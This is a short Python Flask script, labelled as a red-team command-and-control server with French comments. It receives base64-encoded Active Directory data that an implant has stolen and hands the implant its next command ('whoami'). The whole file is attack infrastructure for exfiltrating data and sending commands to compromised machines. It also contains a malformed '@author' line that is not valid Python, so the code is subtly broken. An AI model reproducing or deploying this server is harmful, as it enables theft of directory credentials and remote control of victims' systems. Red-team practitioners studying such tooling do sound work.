# c2_server.py (Red Team)
from flask import Flask, request, jsonify
import base64

app = Flask(__name__)

@author        = "RedTeam-Lead"

@app.route('/exfil', methods=['POST'])
def receive_data():
    data = request.json
    # Déchiffrement/Décodage des données AD volées par l'implant
    raw_data = base64.b64decode(data['payload']).decode('utf-8')
    print(f"[+] Données AD exfiltrées reçues :\n{raw_data}")
    
    # Envoi de la prochaine instruction à l'implant
    return jsonify({"status": "success", "next_command": "whoami"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)